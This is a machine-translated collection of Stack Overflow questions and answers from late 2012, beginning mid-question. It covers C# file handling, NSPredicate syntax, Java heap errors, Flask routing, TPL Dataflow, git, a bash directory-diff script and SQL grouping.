                        Helper.MyWriteLine("---->Marked for copy " + file.Name + ".");
                    }
                }
            } 
```

它在 d:\cnbrd\datafeeds\authorizeddatafeedfile_20121127.txt 的日志中显示错误

```
11/28/2012 1:27:53 AM -->DataFeeds Folder: D:\CNBRD\DataFeeds
11/28/2012 1:27:53 AM -->WildCards: Inactive
11/28/2012 1:27:53 AM -->There are 7 files
11/28/2012 1:27:53 AM Checking d:\cnbrd\datafeeds\authorizeddatafeedfile_20121127.txt
11/28/2012 1:27:53 AM Exception occured: The path is not of a legal form. 
```

为什么会这样？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-28T06:49:30.313

问题在这里：

```
file.Replace(" ", "").Name.IndexOf(dfFileWildCard.Replace(" ", ""), StringComparison.OrdinalIgnoreCase) > -1 
```

应该是：

```
file.Name.Replace(" ", "").IndexOf(dfFileWildCard.Replace(" ", ""), StringComparison.OrdinalIgnoreCase) > -1 
```

注意我正在打电话`Replace`。`file.Name`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-28T06:50:06.600

我很确定它在这个代码块中：

```
if (
    file.Replace(" ", "").Name.IndexOf(dfFileWildCard.Replace(" ", ""), StringComparison.OrdinalIgnoreCase) > -1
    &&
    file.LastWriteTime.Date == DateTime.Now.Date
    ) 
```

由于您正在执行 file.Replace(...) 您正在调用[此](http://msdn.microsoft.com/en-us/library/8a3t4ek5.aspx)方法，它实际上替换了文件的内容，并且在这种情况下，创建了一个备份文件，由于“”中指定的备份文件，该备份文件将失败。我认为您正在尝试读取文件名？如果是这种情况，那么您可能需要以下内容。

```
if (
    file.Name.Replace(" ", "").Name.IndexOf(dfFileWildCard.Replace(" ", ""), StringComparison.OrdinalIgnoreCase) > -1
    &&
    file.LastWriteTime.Date == DateTime.Now.Date
    ) 
```

# html - CSS 优化建议

> ID：13599285
> 
> 赞同：-2
> 
> 时间：2012-11-28T06:42:31.390
> 
> 标签：html, css

我正在处理我的一个项目，这是我第一次将 PSD 转换为 HTML/CSS。到目前为止，我将我的工作放到了网上，如果我能就我做错的事情得到建议（我还没有精灵，但我会的），那就太好了。

链接在那里 已编辑

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T06:45:15.383

你需要做

▸ 利用浏览器缓存 [得分：8/100]

▸优化图像 [分数：22/100]

▸启用压缩

还有一个

```
ReferenceError: jQuery is not defined

})(jQuery); 
```

这也是调整浏览器大小的问题

![在此处输入图像描述](../Images/8408f571c3616278754e8181c72a38f0.png)

**注意：**除非你真的需要，否则不要使用`!important`，但你的用途太重要了

也好像你没有休息浏览器默认css ...尝试[http://meyerweb.com/eric/tools/css/reset/](http://meyerweb.com/eric/tools/css/reset/)

# objective-c - 带有 OR 的客观 c nspredicates 无法解析

> ID：13599286
> 
> 赞同：1
> 
> 时间：2012-11-28T06:42:39.467
> 
> 标签：objective-c, ios, nspredicate

任何人都知道为什么这会在运行时出现“无法解析格式字符串”错误？

```
[wordListArray filterUsingPredicate:[NSPredicate predicateWithFormat:@"pinyin contains[cd] %@ OR pinyin contains[cd] %@ OR BEGINSWITH[cd] %@", [NSString stringWithFormat:@" %@1", searchTerm], [NSString stringWithFormat:@" %@2", searchTerm], searchTerm]]; 
```

出于某种原因，当我做复杂的谓词（即那些带有 OR 的谓词）时，我会得到这个。我认为 nspredicate 应该能够处理这个？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T06:58:20.120

您之前缺少一些搜索关键字`"BEGINSWITH[cd] %@"`。添加它并检查它是否仍然显示此错误。可能你正在研究类似的东西，

`@"(pinyin contains[cd] %@) OR (pinyin contains[cd] %@) OR (pinyin BEGINSWITH[cd] %@)"`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T06:45:56.083

如果我没记错的话，`AND`也`OR`没有为我工作，但是`&&`做`||`了。

# iphone - iPhone 5 和 iPhone 4 界面生成器中的居中对齐

> ID：13599287
> 
> 赞同：3
> 
> 时间：2012-11-28T06:42:44.060
> 
> 标签：iphone, ios, xcode, user-interface

在 XCode 界面生成器中：我的视图中有一些图像，我需要它们垂直居中对齐。但是 Retina 4 和 Retina 3.5 的屏幕高度不同，我不喜欢使用 OS6 作为相对坐标。无论如何要这样做是界面构建器还是我应该编写一些代码？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-28T09:19:22.003

在界面生成器中使用自动布局，选择您的视图，选择画布右下角的约束菜单，然后在容器中选择垂直居中。这将适用于两种屏幕尺寸。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-28T06:45:06.103

您可能应该为此使用实际代码。

幸运的是，它相当简单：只需获得屏幕高度，减去图像高度，然后除以 2。

```
CGFloat height = [[UIScreen mainScreen] bounds].size.height;
CGRect frame = [imageView frame];
frame.origin.y = (height-frame.size.height)/2;
[imageView setFrame:frame]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T07:28:38.880

您可以使用自动调整大小（IB-> 大小检查器）。但是，如果为 xib 设置了自动布局，您将看不到自动调整大小的选项。您必须先删除自动布局（IB-> 文件检查器），然后根据需要设置自动调整大小的属性。

# c# - 如何为前端/集成测试设置 CouchDB？

> ID：13599289
> 
> 赞同：1
> 
> 时间：2012-11-28T06:43:01.660
> 
> 标签：c#, asp.net-mvc, couchdb, teamcity, integration-testing

我目前正在研究 CouchDB，以便在即将到来的项目中使用。它具有我喜欢使用的功能，但是对于 NoSQL 来说是新手，我想了解在进行前端/集成测试时如何设置 CouchDB。我正在做 BDD，所以基本上在每个场景之间我需要能够回滚/重置/恢复 CouchDB，以便场景之间没有数据依赖关系。但我还没有找到一种干净的方法来做到这一点。因此，任何建议都会受到欢迎。

在每个场景完成后，它会像从 CouchDB 中删除 db 一样简单吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T08:30:34.377

那应该行得通。您可以查看 couchdb-python 中的测试方法作为示例：

[http://code.google.com/p/couchdb-python/source/browse/couchdb/tests/testutil.py](http://code.google.com/p/couchdb-python/source/browse/couchdb/tests/testutil.py)

# java - 使用 FOR lOOP 时 java 堆内存使用异常

> ID：13599290
> 
> 赞同：0
> 
> 时间：2012-11-28T06:43:06.097
> 
> 标签：java, memory-management, for-loop, out-of-memory

当我运行下面的程序时，当 for 循环在 i=1031521 开始执行时出现异常。如何克服这种类型的内存使用？

```
class wwww
    {
        public static void main(String args[])
        {
            String abc[]=new String[4194304];
            String wwf="";
            int s_count=524286;
            for(int i=0;i<4194304;i++)
            {
                System.out.println("----------enter--------"+i);
                abc[i]=""+i;
                System.out.println("----------exit--------"+i);
            }
        }
    } 
```

例外是：

```
Exception in thread "main" java.lang.OutOfMemoryError: Java heap space
    at java.util.Arrays.copyOf(Arrays.java:2882)
    at java.lang.AbstractStringBuilder.expandCapacity(AbstractStringBuilder.
java:100)
    at java.lang.AbstractStringBuilder.append(AbstractStringBuilder.java:390
)
    at java.lang.StringBuilder.append(StringBuilder.java:119)
    at wwww.main(wwww.java:12) 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:45:57.080

> 如何克服这种类型的内存使用？

不要*执行*这种类型的内存使用。您正在创建一般形式的 4194304 个字符串`""+i`。您不需要*一次*全部使用该格式的 4194304 个字符串。您一次只需要其中一个，如果有的话，您可以在每次需要时创建它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-28T06:50:47.807

这是因为您用尽了分配给您的 jvm 的所有堆空间。

您可以在运行程序时使用参数来指定要分配的堆大小。

这是一个例子：

```
java -Xmx256m MyClass 
```

这里将分配最多 256 MB 的堆空间

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-28T06:52:28.513

您可以：

1.  增加你给程序的堆大小。这是通过`-Xmx`命令行参数来完成的`java`。
2.  重新设计程序以使用更少的内存。您真的需要一次将所有这些字符串保存在内存中吗？

# java - 涉及多个级联连接的条件查询

> ID：13599291
> 
> 赞同：0
> 
> 时间：2012-11-28T06:43:09.390
> 
> 标签：java, jpa, criteria-api, criteriaquery

我有三个实体：`Block`和`View`想要`TargetBlock`为以下 sql 创建一个 JPA Criteria 查询。

```
select * from Block INNER JOIN TargetBlock tb ON tb.blockID = b.blockID INNER JOIN view v ON tb.viewID = v.viewID 
```

块有很多意见和很多`TargetBlocks`。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T14:41:43.017

有关 Criteria API 的文档，请参阅，

[http://wiki.eclipse.org/EclipseLink/UserGuide/JPA/Basic_JPA_Development/Querying/Criteria#Join](http://wiki.eclipse.org/EclipseLink/UserGuide/JPA/Basic_JPA_Development/Querying/Criteria#Join)

# python - 如果覆盖默认值，如何为 Flask 提供静态服务？

> ID：13599295
> 
> 赞同：1
> 
> 时间：2012-11-28T06:43:22.633
> 
> 标签：python, flask

我编写了自己的动态路线，如下所示：

```
@app.route('/')
@app.route('/<controller>')
@app.route('/<controller>/<action>')
@app.route('/<controller>/<action>/<id>') # <--- this route overrides
def main(controller = None, action = None, id = None): 
```

我标记的地方`#`，该路由覆盖了默认行为，`/static/css/filename.css`因为这是一个有效的路由。如何使用我的动态路由提供这些文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T07:56:54.750

好吧，您的生根非常笼统，基本上它会抓取所有内容（不是所有内容，但您知道它匹配所有字符串和 URL 的结构）并与至少一个规则匹配。因此，如果您想保留为静态文件提供服务的规则，只需使用类似的内容`@app.route('/static/css/')`，此规则应该为将提供静态文件的视图提供服务。

但总的来说，我认为这不是一般的好方法。我想说看看[蓝图](http://flask.pocoo.org/docs/blueprints/)并在它们的帮助下进行模块化应用程序。然后，您可以为每个蓝图定义 URL 开头，这样您就可以分离模块和路由。这种通用方法在未来可能会导致越来越多的问题。但这是你的选择；）

# android - 使用可在运行时读取的任意 XML 文件

> ID：13599301
> 
> 赞同：0
> 
> 时间：2012-11-28T06:43:57.160
> 
> 标签：android, xml, android-preferences

这是`Activity`我使用该`setContentView`方法的地方。在这个应用程序中，我使用`xml`文件夹中的一个文件`res`夹并将`prefs.xml`文件放入其中。

公共类 SetWallpaperActivity 扩展 Activity {

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    //setContentView(android.R.xml.);
    //setContentView(R.xml.prefs.xml);
    setContentView(android.R.xml.); //   This line GENERATE ERROR...
} 
```

这是我的`prefs.xml`文件：

```
 <?xml version="1.0" encoding="utf-8"?>
<PreferenceScreen xmlns:android="schemas.android.com/apk/res/android"; >    
     <CheckBoxPreference android:key="touch" android:title="Enable Touch">/CheckBoxPreference>
    <EditTextPreference android:key="numberOfCircles" android:title="Number of Circles"></EditTextPreference> 
</PreferenceScreen> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T08:04:52.147

从您作为评论发布的 xml 文件（其中包含首选项）来看，您可能希望创建一个设置屏幕，用户可以从中为您的应用设置各种首选项。如果是这种情况，那么您需要扩展[`PreferenceActivity`](http://developer.android.com/reference/android/preference/PreferenceActivity.html)类而不是正常的`Activity`：

```
public class SetWallpaperActivity extends PreferenceActivity {

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        addPreferencesFromResource(R.xml.the_name_of_the_xml_file); // R.xml.prefs.xml from your code
    }
} 
```

还可以在[android 开发者网站](http://developer.android.com/guide/topics/ui/settings.html)上查看有关此的官方指南。

您不能将内容视图设置为文件`res/xml`夹中的 xml 文件，因为`setContentView`需要布局文件的 id（格式为`R.layout.the_layout_file`）。

# c# - TPL Dataflow，Post() 和 SendAsync() 之间的功能区别是什么？

> ID：13599305
> 
> 赞同：59
> 
> 时间：2012-11-28T06:44:07.410
> 
> 标签：c#, concurrency, task-parallel-library, message-passing, tpl-dataflow

我对通过 Post() 或 SendAsync() 发送项目之间的区别感到困惑。我的理解是，在所有情况下，一旦项目到达数据块的输入缓冲区，控制权就会返回到调用上下文，对吗？那我为什么需要 SendAsync 呢？如果我的假设不正确，那么我想知道，相反，如果使用数据块的整个想法是建立一个并发和异步环境，为什么有人会使用 Post()。

我当然理解技术上的区别，即 Post() 返回一个 bool 而 SendAsync 返回一个可等待的 bool 任务。但这有什么影响？什么时候会延迟返回布尔值（我的理解是确认该项目是否已放入数据块的队列中）？我理解 async/await 并发框架的一般概念，但在这里它没有多大意义，因为除了 bool 之外，对传入项目所做的任何事情的结果都不会返回给调用者，而是放在一个“out-queue”并转发到链接的数据块或丢弃。

发送物品时这两种方法之间有什么性能差异吗？

* * *

## 回答 #1

> 赞同：68
> 
> 时间：2012-11-28T13:17:35.540

要查看差异，您需要一个块将推迟其消息的情况。在这种情况下，`Post`将`false`立即返回，而将在块决定如何处理消息时`SendAsync`返回将完成的 a 。`Task`如果消息被接受，`Task`则将有结果，如果不接受，则将有结果。`true``false`

延迟情况的一个示例是非贪婪连接。一个更简单的例子是当你设置`BoundedCapacity`：

```
[TestMethod]
public void Post_WhenNotFull_ReturnsTrue()
{
    var block = new BufferBlock<int>(new DataflowBlockOptions {BoundedCapacity = 1});

    var result = block.Post(13);

    Assert.IsTrue(result);
}

[TestMethod]
public void Post_WhenFull_ReturnsFalse()
{
    var block = new BufferBlock<int>(new DataflowBlockOptions { BoundedCapacity = 1 });
    block.Post(13);

    var result = block.Post(13);

    Assert.IsFalse(result);
}

[TestMethod]
public void SendAsync_WhenNotFull_ReturnsCompleteTask()
{
    // This is an implementation detail; technically, SendAsync could return a task that would complete "quickly" instead of already being completed.
    var block = new BufferBlock<int>(new DataflowBlockOptions { BoundedCapacity = 1 });

    var result = block.SendAsync(13);

    Assert.IsTrue(result.IsCompleted);
}

[TestMethod]
public void SendAsync_WhenFull_ReturnsIncompleteTask()
{
    var block = new BufferBlock<int>(new DataflowBlockOptions { BoundedCapacity = 1 });
    block.Post(13);

    var result = block.SendAsync(13);

    Assert.IsFalse(result.IsCompleted);
}

[TestMethod]
public async Task SendAsync_BecomesNotFull_CompletesTaskWithTrueResult()
{
    var block = new BufferBlock<int>(new DataflowBlockOptions { BoundedCapacity = 1 });
    block.Post(13);
    var task = block.SendAsync(13);

    block.Receive();

    var result = await task;
    Assert.IsTrue(result);
}

[TestMethod]
public async Task SendAsync_BecomesDecliningPermanently_CompletesTaskWithFalseResult()
{
    var block = new BufferBlock<int>(new DataflowBlockOptions { BoundedCapacity = 1 });
    block.Post(13);
    var task = block.SendAsync(13);

    block.Complete();

    var result = await task;
    Assert.IsFalse(result);
} 
```

* * *

## 回答 #2

> 赞同：20
> 
> 时间：2012-11-28T07:09:50.227

IMO，该文档使这一点相当清楚。特别是，对于[`Post`](http://msdn.microsoft.com/en-us/library/hh194836.aspx)：

> 一旦目标块决定接受或拒绝该项目，此方法将返回，但除非目标块的特殊语义另有规定，否则它不会等待项目实际被处理。

和：

> 对于支持延迟提供消息的目标块，或者对于可能在其`Post`实现中进行更多处理的块，请考虑使用`SendAsync`，它将立即返回并使目标能够推迟发布的消息并在`SendAsync`返回后稍后使用它。

换句话说，虽然两者在*处理*消息方面都是异步的，但也`SendAsync`允许目标块决定是否异步*接受*消息。

这听起来像是`SendAsync`一种通常“更异步”的方法，并且通常可能受到鼓励。我*不清楚*为什么两者都是必需的，因为这听起来肯定`Post`大致相当于使用`SendAsync`然后等待结果。正如评论中所指出的，有*一个*显着的区别：如果缓冲区已满，`Post`将立即拒绝，而`SendAsync`不会。

# android - Android VideoView 没有从内部内存播放视频

> ID：13599310
> 
> 赞同：1
> 
> 时间：2012-11-28T06:44:23.400
> 
> 标签：android, android-videoview

我开发了一个播放视频的应用程序。我使用 VideoView 视图播放视频。从 url 播放视频工作正常。但是当我尝试从内部存储器装置（应用程序内存）播放视频时，它总是显示以下对话框![在此处输入图像描述](../Images/dcaa2ee4453a67f04068ae096ebb5512.png)

我在日志猫中得到这个

```
11-28 12:09:22.171: E/MediaPlayer(4862): error (1, -2147483648)
11-28 12:09:22.292: E/MediaPlayer(4862): Error (1,-2147483648)
11-28 12:09:22.292: D/VideoView(4862): Error: 1,-2147483648 
```

任何人都可以帮助我

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T13:59:31.507

On many older phones, pre Android 4.0, videos needed to be written world readable to be played even from an apps internal files directory.

# javascript - JavaScript IE8 错误 - 对象不支持此属性

> ID：13599315
> 
> 赞同：0
> 
> 时间：2012-11-28T06:45:07.897
> 
> 标签：javascript, jquery, ajax

IE 8 说：它不支持这个属性或方法：

代码在这里（整个部分出现错误）：

```
$('li').has('ul').mouseover(function(){
    $(this).children('ul').css('visibility','visible');
}).mouseout(function(){
    $(this).children('ul').css('visibility','hidden');
}) 
```

此代码是此功能的一部分：

```
if ($.browser.msie && $.browser.version.substr(0,1) < 7) {
    $('li').has('ul').mouseover(function(){
        $(this).children('ul').css('visibility','visible');
    }).mouseout(function(){
        $(this).children('ul').css('visibility','hidden');
    })
} 
```

这有什么问题..请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T09:28:02.570

我不确定，但小校正使用`$('li ul')`而不是`$('li').has('ul')`

# git - git：子目录中忽略的更改

> ID：13599319
> 
> 赞同：1
> 
> 时间：2012-11-28T06:45:29.250
> 
> 标签：git, git-submodules

我的仓库中有一个停止跟踪更改的子目录。我可以将 abc.php 文件添加到某个级别以上的任何目录并`git status`返回预期结果，但是一旦我将 abc.php 添加到有问题的子目录（或更改现有文件），`git status`就会出现空。我相信子目录*曾经*有它自己的 git repo，但我可能是错的。

我看到这`git update-index --really-refresh` [可能是一个选项](https://stackoverflow.com/questions/9034999/git-novice-git-is-not-tracking-changes-in-a-sub-directory)，但我很担心，因为我将其他 git 项目添加到有问题的“兄弟”目录中。（我没有在我的父仓库中做任何事情来承认这些，所以希望这也可以。）

也就是说，我有

1.  ...dir/custom（忽略更改的目录）
2.  ...dir/sibling1（具有自己的 git repo 的兄弟目录 1）
3.  ...dir/sibling2（带有自己的 git repo 的兄弟目录 2）

dir 及以上的每个父目录都没有问题，并且按预期工作。

我的主要问题：考虑到上述结构，我应该担心运行它吗？我还想问一下我*是否应该*对主仓库中的仓库做些什么（即以某种方式将它们声明为子模块）？

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-05T05:07:30.717

好的，我需要运行以下两个命令才能使其正常工作：

```
git rm --cached path_to_subdir (no trailing slash)

git add path_to_subdir/* 
```

Based on the messaging I was seeing when trying to run the command in my original post (`git update-index --really-refresh`), there used to be a git repo in the sub-directory that was not [removed properly](https://stackoverflow.com/questions/1260748/how-do-i-remove-a-git-submodule), and was never declared as a sub-module.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T07:02:45.447

2种可能性：

*   目录本身被忽略（`.gitignore`在任何父目录中的文件中）
*   或者在被忽略的目录中有一个 .git 目录，使其成为嵌套的 git repo（其状态将被父 repo 忽略）。

# bash - 如何在linux中制作一个winmerge等价物

> ID：13599322
> 
> 赞同：1
> 
> 时间：2012-11-28T06:45:45.680
> 
> 标签：bash

我的朋友最近问如何比较 linux 中的两个文件夹，然后对任何不同的文本文件运行 meld。我正在慢慢理解将许多细粒度实用程序组合在一起的 linux 哲学，我将以下解决方案放在一起。我的问题是，我该如何改进这个脚本。似乎有相当多的冗余，我希望学习更好的方式编写 unix 脚本。

```
#!/bin/bash

dir1=$1
dir2=$2

# show files that are different only
cmd="diff -rq $dir1 $dir2"
eval $cmd # print this out to the user too
filenames_str=`$cmd`

# remove lines that represent only one file, keep lines that have
# files in both dirs, but are just different
tmp1=`echo "$filenames_str" | sed -n '/ differ$/p'` 

# grab just the first filename for the lines of output
tmp2=`echo "$tmp1" | awk '{ print $2 }'`

# convert newlines sep to space
fs=$(echo "$tmp2") 

# convert string to array
fa=($fs) 

for file in "${fa[@]}"
do
    # drop first directory in path to get relative filename
    rel=`echo $file | sed "s#${dir1}/##"`

    # determine the type of file
    file_type=`file -i $file | awk '{print $2}' | awk -F"/" '{print $1}'`

    # if it's a text file send it to meld
    if [ $file_type == "text" ]
    then
        # throw out error messages with &> /dev/null
        meld $dir1/$rel $dir2/$rel &> /dev/null
    fi 
done 
```

请保持/提高答案的可读性。更短但更难理解的答案不能作为答案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2016-11-30T18:31:24.797

这是一个老问题，但让我们只是为了好玩而稍微研究一下，不要考虑最终目标（可能是 SCM），也不要考虑已经以更好的方式做到这一点的工具。让我们专注于脚本本身。

在 OP 的脚本中，bash 内部有很多字符串处理，使用和之类的工具`sed`，`awk`有时在同一命令行中或在执行 n 次的循环中不止一次（每个文件一个）。

没关系，但有必要记住：

*   每次脚本调用这些程序中的任何一个时，它都会在操作系统中创建一个新进程，这在时间和资源上都是昂贵的。所以调用的程序越少，正在执行的脚本的性能就越好：

    *   `diff` 2 次（1 次仅打印给用户）
    *   `sed` 1次处理`diff`结果，每个文件1次
    *   `awk` 1次处理`sed`结果，每个文件2次（处理`file`结果）
    *   `file` 每个文件1次
*   这不适用于`echo`,`read`和`test`其他 bash 的内置命令，因此不会执行任何外部程序。

*   `meld`是将文件显示给用户的最后一个命令，所以它不计算在内。
*   即使使用内置命令，重定向管道`|`也有成本，因为 shell 必须创建管道、复制句柄，甚至可能创建 shell 的分支（这是一个进程本身）。再说一遍：越少越好。
*   命令的消息`diff`是依赖于语言环境的，所以如果系统不是英文的，整个脚本将无法工作。

考虑到这一点，让我们清理一下原始脚本，保持 OP 的逻辑：

```
#!/bin/bash

dir1=$1
dir2=$2

# Set english as current language
LANG=en_US.UTF-8
# (1) show files that are different only
diff -rq $dir1 $dir2 | 
    # (2) remove lines that represent only one file, keep lines that have
    # files in both dirs, but are just different, delete all but left filename
    sed '/ differ$/!d; s/^Files //; s/ and .*//' |
    # (3) determine the type of file
    file -i -f - | 
    # (4) for each file
    while IFS=":" read file file_type
    do
        # (5) drop first directory in path to get relative filename
        rel=${file#$dir1}
        # (6) if it's a text file send it to meld
        if [[ "$file_type" =~ "text/" ]]
        then
            # throw out error messages with &> /dev/null
            meld ${dir1}${rel} ${dir2}${rel} &> /dev/null
        fi 
    done 
```

稍微解释一下：

1.  唯一的命令链，`cmd1 | cmd2 | ...`其中`stdout`前一个的输出 ( `stdin`) 是下一个的输入 ( )。
2.  只执行`sed`一次以`;`在输出中执行 3 个操作（用 分隔）`diff`：
    *   删除以`" differ"`
    *   `"Files "`在剩余行的开头删除
    *   删除从`" and "`到剩余行的末尾
3.  执行`file`一次命令以处理`stdin`（选项`-f -`）中的文件列表
4.  使用bash 语句读取由. 的每一行`while`分隔的两个值。`:``stdin`
5.  使用 bash 变量替换从变量中提取文件名
6.  使用 bash 测试将文件类型与正则表达式进行比较

为清楚起见，我没有考虑文件和目录名称可能包含空格。在这种情况下，两个脚本都会失败。为避免这种情况，任何对文件/目录名称变量的引用都必须用双引号引起来。

我没有使用`awk`，因为它足够强大，几乎可以替换整个脚本；-)

# google-plus - Android：Google Plus 个人资料供稿

> ID：13599323
> 
> 赞同：2
> 
> 时间：2012-11-28T06:45:49.500
> 
> 标签：google-plus

在 Google Plus 中使用 Google Api 我只能获得由该特定用户（由谁登录）执行的公开帖子，如下所示：：

```
private Person profile = null;
profile = plus.people().get("me").execute();    
Plus.Activities.List list = plus.activities().list(id,"public");
((com.google.api.services.plus.Plus.Activities.List) list).setMaxResults(Long.parseLong("50"));
ActivityFeed feed = ((com.google.api.services.plus.Plus.Activities.List) list).execute(); 
```

如何获取用户以及其他用户（朋友）执行的所有帖子，如 Google plus 用户个人资料中所示？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T22:20:35.700

目前，Google+ API 仅提供用户对公开帖子的访问权限。此外，Google+ 目前不提供允许您列出特定用户的朋友的方法。

# c# - 如何通过汇总数据表中所需的列来删除重复的行

> ID：13599328
> 
> 赞同：0
> 
> 时间：2012-11-28T06:46:04.133
> 
> 标签：c#, asp.net

大家好，我的数据表来自我的数据库，如下所示

```
Name       Total
XYZ         20
XYZ         20
ABC         20 
```

现在我想让我的数据表如下

```
Name       Total
XYZ         40
ABC         20 
```

我`linq`从这里尝试了这个[查找重复记录并将记录合并到单个数据表c#](https://stackoverflow.com/questions/13062875/find-duplicate-and-merge-record-into-single-datatable-c-sharp)中，它工作正常，但是由于我从数据库中获取我的值，所以我不知道变量的类型，所以有人可以帮助我并给我非解决方案链接方式

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-28T07:21:00.143

如果您有两张桌子，并且想要将它们全部组合起来，那么下面就是您所追求的

```
SELECT bothTables.Name, SUM(total) FROM
(
   SELECT Name, SUM(total) as total FROM Table_1 GROUP BY Name
   UNION ALL
   SELECT Name, SUM(total) as total FROM Table_2 GROUP BY Name
) AS bothTables
GROUP BY bothTables.Name
ORDER BY bothTables.Name desc 
```

或者如果您想使用您的数据表（本例中为 dt）来执行此操作

```
var summedValues = from table in dt.AsEnumerable()
                   group table by table.Field<string>("Name")
                   into groupedTable
                   select new
                             {
                                Name = groupedTable.Key,
                                Total = groupedTable.Sum(x => x.Field<int>("Total"))
                             }; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-28T06:55:51.103

解决方案的 SQL 版本将是：

```
select Name, sum(Total) group by Name 
```

# jquery - Wicket 中的动画模态对话框

> ID：13599330
> 
> 赞同：1
> 
> 时间：2012-11-28T06:46:15.730
> 
> 标签：jquery, ajax, jquery-animate, wicket

我希望通过使用 jQuery fadeIn() 方法显示来增强 Wicket (6.x) ModalDialog 的显示，而不是简单地显示对话框的默认行为。我首先修改了 modal.js doShow() 方法以删除样式，如下所述。

```
var doShow = Wicket.bind(function() {
    this.adjustOpenWindowZIndexesOnShow();
    // don't want to blatantly show
    //this.window.style.visibility="visible";
}, this); 
```

这似乎达到了预期的效果。然后我修改了显示对话框的 AJAX 逻辑以调用fadeIn 函数。这就是事情向南发展的地方。下面代码片段中的“警报”被正确调用，但我所包含的两个 JavaScript 似乎都没有被执行。在处理初始单击（应该显示我的对话框）后查看 HTML 时，我不再在模态窗口中看到我期望的内容。

```
protected void showDialog(AjaxRequestTarget argTarget) {
    argTarget.appendJavaScript("alert('hello test '+$('#imageWindow'));");
    argTarget.appendJavaScript("$('#"+imageModalWindow.getMarkupId()+"').fadeIn(1000);");
    imageModalWindow.show(argTarget);
    // even try to reset visibility
    argTarget.appendJavaScript("$('#"+imageModalWindow.getMarkupId()+"').css({'visibility':'visible'});");
} 
```

欢迎在这一点上提出任何建议。我在我的 HTML 和 Java 代码中设置了 imageWindow 的 id（和 Wicket id）。我将输出标记 id 设置为 true，但在执行 JavaScript 时，我似乎遗漏了一些相当基本的东西。除了眼前的问题，我想知道是否没有更好的方法来处理这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-28T11:31:39.583

扩展 modalwindow 并覆盖 getWindowOpenJavaScript() 或 getShowJavaScript() 方法，我没有机会深入了解，但我认为你需要 getShowJavaScript()。签出它返回的javascript，然后你应该能够看到你是否可以简单地附加fadeIn代码或需要完全更改javascript。

# .net - Web 服务后台工作者？

> ID：13599337
> 
> 赞同：0
> 
> 时间：2012-11-28T06:46:38.880
> 
> 标签：.net, multithreading, queue, backgroundworker

我有一个 Windows 服务，如果有新记录，它将每 20 分钟检查一次数据库。它会将其发送到 Web 服务以存储到另一个数据库。

一切正常，但我想提高发送速度。我打算在 web 服务中使用队列来存储 WS 发送到的记录，并且将运行一个方法来检查该队列并将队列中的记录保存到数据库。

我有什么办法吗？Tks

# jquery - jQuery UI：我需要什么文件？

> ID：13599340
> 
> 赞同：8
> 
> 时间：2012-11-28T06:46:53.640
> 
> 标签：jquery, jquery-ui

我正在网站中实现标签。
我想使用[这个](http://jqueryui.com/tabs/)jQuery UI 小部件。网站上有 jQuery 的其他用途，但没有 jQueryUI（仅在这个特定的地方）。
所以我试图只包含 jQueryUI 所需的部分。
如何确定必须包含 js 代码的最少部分？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-28T06:52:22.543

要找出只是去这个网页

1.  [jQuery 用户界面](http://jqueryui.com/download/)
2.  选择全部切换（删除所有刻度）
3.  然后只需检查选项卡，然后它会自动选择您需要的所有选项，即核心、小部件和选项卡。

您还将一如既往地需要普通的 jQuery 库。当您引用它们时，必须首先使用 jQuery 库

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-28T06:52:27.043

你需要：

*   jQuery 库

    `<script src="http://code.jquery.com/jquery-1.8.3.js"></script>`

*   jQuery UI 库

    `<script src="http://code.jquery.com/ui/1.9.2/jquery-ui.js"></script>`

*   jQuery UI CSS：

    `<link rel="stylesheet" href="http://code.jquery.com/ui/1.9.2/themes/base/jquery-ui.css" />`

# mysql - 在mysql表中搜索许多道具

> ID：13599345
> 
> 赞同：2
> 
> 时间：2012-11-28T06:47:06.133
> 
> 标签：mysql, sql, select, where

有一个包含 2 列的表：

```
x    y
1    1
1    2
1    3
2    2
2    3
2    4
3    1
3    2
3    5 
```

如果我需要找到所有 X，其中 Y = 5。我使用查询

```
SELECT * FROM table WHERE y = 5 
```

但是，我需要找到所有 X，其中 Y = 2 AND Y = 3。

如何在 1 个查询中执行此操作？

结果我必须得到 X = 1 和 2（不是 3！）。Y 可能很多

```
If i use SELECT * FROM table WHERE y IN (1, 2) 
```

我会得到 x = 1, 2, 3，但我**不需要 Y = 3**，因为在表中没有行 x=3, y=3

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-28T06:50:46.517

```
SELECT   x
FROM     tableName
WHERE    y IN (2,3)
GROUP BY X
HAVING COUNT(*) = 2 
```

*   [SQLFiddle 演示](http://sqlfiddle.com/#!2/3d8bb/1)

如果没有为每个 x 指定唯一约束，则`DISTINCT`必须

```
SELECT   x
FROM     tableName
WHERE    y IN (2,3)
GROUP BY X
HAVING COUNT(DISTINCT y) = 2 
